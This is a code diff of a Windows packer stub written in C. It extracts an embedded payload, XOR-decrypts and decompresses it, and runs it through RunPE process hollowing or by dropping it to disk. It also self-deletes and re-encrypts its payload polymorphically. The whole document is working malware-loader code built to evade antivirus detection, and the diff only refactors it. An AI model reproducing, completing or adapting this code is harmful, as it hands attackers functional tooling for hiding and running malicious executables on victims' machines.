@@ -1,32 +1,11 @@
-/*
-
-    Stub for Packer.exe
-    Copyright (C) 2016  93aef0ce4dd141ece6f5
-
-    This program is free software: you can redistribute it and/or modify
-    it under the terms of the GNU General Public License as published by
-    the Free Software Foundation, either version 3 of the License, or
-    (at your option) any later version.
-
-    This program is distributed in the hope that it will be useful,
-    but WITHOUT ANY WARRANTY; without even the implied warranty of
-    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
-    GNU General Public License for more details.
-
-    You should have received a copy of the GNU General Public License
-	along with this program. If not, see <http://www.gnu.org/licenses/>.
-
-*/
-
-
 #include <stdio.h>
-#include <string.h>
+#include <stdlib.h>
 #include <stdarg.h>
 #include <windows.h>
-#include <wincrypt.h>
-#include <zlib.h>
+#include <Wincrypt.h>	
 
 #include "packer.h"
+#include "quicklz.h"
 
 #define WIN32_LEAN_AND_MEAN
 #define DEBUG
@@ -47,7 +26,7 @@ VOID Debug(LPCSTR fmt, ...) {
 #endif
 }
 
-FileStruct *ExtractPayload(VOID) {
+FileStruct *ExtractFile(VOID) {
 	FileStruct *fs = (FileStruct *)malloc(sizeof(*fs));
 	if (fs == NULL) return NULL;
 
@@ -173,13 +152,13 @@ BOOL GenerateKey(FileStruct *fs) {
 
 // XOR
 BOOL DecryptPayload(FileStruct *fs) {
-	PBYTE pDecryptPayloadedBuffer = (PBYTE)malloc(fs->dwBufSize);
-	if (pDecryptPayloadedBuffer == NULL) return FALSE;
+	PBYTE pDecryptedBuffer = (PBYTE)malloc(fs->dwBufSize);
+	if (pDecryptedBuffer == NULL) return FALSE;
 
 	for (DWORD i = 0; i < fs->dwBufSize; i++)
-		pDecryptPayloadedBuffer[i] = fs->pBuffer[i] ^ fs->pKey[i % KEY_LEN];
+		pDecryptedBuffer[i] = fs->pBuffer[i] ^ fs->pKey[i % KEY_LEN];
 
-	fs->pBuffer = pDecryptPayloadedBuffer;
+	fs->pBuffer = pDecryptedBuffer;
 
 	return TRUE;
 }
@@ -189,10 +168,12 @@ BOOL Encrypt(FileStruct *fs) {
 	return DecryptPayload(fs);
 }
 
-BOOL DecompressPayload(FileStruct *fs) {
-	PBYTE pDecompressedBuffer = (PBYTE)malloc(fs->dwFileSize);
-	ULONG ulDecompressedBufSize;
-	uncompress(pDecompressedBuffer, &ulDecompressedBufSize, fs->pBuffer, fs->dwFileSize);
+BOOL DecompressFile(FileStruct *fs) {
+	ULONG ulDecompressedBufSize = qlz_size_decompressed((char *)fs->pBuffer);
+	PBYTE pDecompressedBuffer = (PBYTE)malloc(ulDecompressedBufSize);
+
+	qlz_state_decompress *state_decompress = (qlz_state_decompress *)malloc(sizeof(qlz_state_decompress));
+	ulDecompressedBufSize = qlz_decompress((char *)fs->pBuffer, pDecompressedBuffer, state_decompress);
 
 	fs->pBuffer = pDecompressedBuffer;
 	fs->dwBufSize = ulDecompressedBufSize;
@@ -200,7 +181,7 @@ BOOL DecompressPayload(FileStruct *fs) {
 	return TRUE;
 }
 
-VOID DropAndExecutePayload(FileStruct *fs, LPCSTR szFileName) {
+VOID ExecutePayload(FileStruct *fs, LPCSTR szFileName) {
 	DWORD dwWritten;
 	HANDLE hFile = CreateFile(szFileName, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 	WriteFile(hFile, fs->pBuffer, fs->dwFileSize, &dwWritten, NULL);
@@ -208,7 +189,7 @@ VOID DropAndExecutePayload(FileStruct *fs, LPCSTR szFileName) {
 	ShellExecute(NULL, NULL, szFileName, NULL, NULL, SW_NORMAL);
 }
 
-BOOL MemoryExecutePayload(FileStruct *fs) {
+BOOL RunPE(FileStruct *fs) {
 	// PE headers
 	PIMAGE_DOS_HEADER pidh;
 	PIMAGE_NT_HEADERS pinh;
@@ -298,37 +279,20 @@ BOOL MemoryExecutePayload(FileStruct *fs) {
 		return FALSE;
 	}
 
-	WaitForSingleObject(pi.hProcess, INFINITE);
+    WaitForSingleObject(pi.hProcess, INFINITE);
 
-	CloseHandle(pi.hProcess);
-	CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
 
 	return TRUE;
 }
-
-/*
-VOID RunFromMemory(FileStruct *fs) {
-	Debug("%p", fs->pBuffer);
-	HMEMORYMODULE hModule = MemoryLoadLibrary(fs->pBuffer, fs->dwFileSize);
-	if (hModule == NULL) {
-		Debug("Memory load library error: %lu\n", GetLastError());
-		return;
-	}
-
-	int nSuccess = MemoryCallEntryPoint(hModule);
-	if (nSuccess < 0) {
-		Debug("Memory call entry point error: %d\n", nSuccess);
-	}
-
-	MemoryFreeLibrary(hModule);
-}
-*/
 
 VOID SelfDelete(LPCSTR szFileName) {
 	PROCESS_INFORMATION pi = { 0 };
 	STARTUPINFO si = { 0 };
 	si.cb = sizeof(si);
-	//CreateFile("old.exe", 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+	CreateFile("old.exe", 0, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE, NULL);
+
 	CHAR szCmdLine[MAX_PATH];
 	sprintf(szCmdLine, "%s delete", szFileName);
 	if (CreateProcess(NULL, szCmdLine, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi) == FALSE) {
@@ -341,12 +305,12 @@ BOOL PolymorphPayload(LPCSTR szFileName) {
 	CopyFile("old.exe", szFileName, FALSE);
 
 	// re-extract resources
-	FileStruct *fs = ExtractPayload();
+	FileStruct *fs = ExtractFile();
 	if (fs == NULL) return FALSE;
 
 	// decrypt buffer
 	if (DecryptPayload(fs) == FALSE) {
-		Debug("DecryptPayload buffer error: %lu\n", GetLastError());
+		Debug("Decrypt buffer error: %lu\n", GetLastError());
 		free(fs);
 		return FALSE;
 	}
@@ -381,19 +345,19 @@ BOOL PolymorphPayload(LPCSTR szFileName) {
 }
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
-	if (strstr(GetCommandLine(), "delete") != NULL) {
-		while (DeleteFile("old.exe") == FALSE);
+    if (strstr(GetCommandLine(), "delete") != NULL) {
+        while (DeleteFile("old.exe") == FALSE);
 	} else {
-		FileStruct *fs = ExtractPayload();
+		FileStruct *fs = ExtractFile();
 		if (fs == NULL) {
 			Debug("Extract file error: %lu\n", GetLastError());
 			return 1;
 		}
 
 		if (DecryptPayload(fs) == TRUE) {
-			if (DecompressPayload(fs) == TRUE)
-				//DropAndExecutePayload(fs, "test.exe");
-				MemoryExecutePayload(fs);
+			if (DecompressFile(fs) == TRUE)
+				//ExecutePayload(fs, "test.exe");
+				RunPE(fs);
 		}
 		free(fs->pBuffer);
 		free(fs);
